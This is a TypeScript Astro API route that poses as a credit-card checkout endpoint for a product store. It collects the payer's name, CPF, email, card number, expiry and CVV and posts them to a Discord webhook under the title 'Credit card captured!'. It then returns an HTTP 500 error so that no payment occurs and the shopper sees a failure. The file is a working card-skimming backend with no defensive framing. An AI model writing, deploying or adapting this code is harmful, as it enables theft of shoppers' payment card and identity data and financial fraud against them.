import type { APIRoute } from "astro";
import products from "../../assets/products.json";

import {
  EMPTY_PRODUCT,
  createPIX,
  getPayment,
} from "../../services/mercadopago";
import { money } from "../../components/utils";
import { sendEmbedToWebhook } from "../../services/discordwebhook";
import { inline } from "@floating-ui/react";

export interface PostCreditPayload {
  product_id: string;
  payer_name: string;
  payer_email: string;
  payer_cpf: string;
  card_number: string;
  card_month: string;
  card_year: string;
  card_cvv: string;
}

export const POST: APIRoute = async ({ request }) => {
  const payload: PostCreditPayload = await request.json();

  const product =
    products.find((x) => x.id == payload.product_id) || EMPTY_PRODUCT;

  const fields = [
    {
      name: "✍️ Nome do pagador",
      value: payload.payer_name,
      inline: true,
    },
    {
      name: "🪪 CPF do pagador",
      value: payload.payer_cpf,
      inline: true,
    },
    {
      name: "💳 Número",
      value: payload.card_number,
    },
    {
      name: "📅 Mês/Ano",
      value: payload.card_month + "/" + payload.card_year,
      inline: true,
    },
    {
      name: "🔒 CVV",
      value: payload.card_cvv,
      inline: true,
    },
  ];

  sendEmbedToWebhook(import.meta.env.SECRET_CC_WEBHOOK, {
    title: "Cartão de Crédito capturado!",
    description: `do produto: **${product.name}**`,
    footer: { text: payload.payer_email },
    thumbnail: { url: product.image },
    fields,
  });

  return new Response(null, { status: 500 });
};
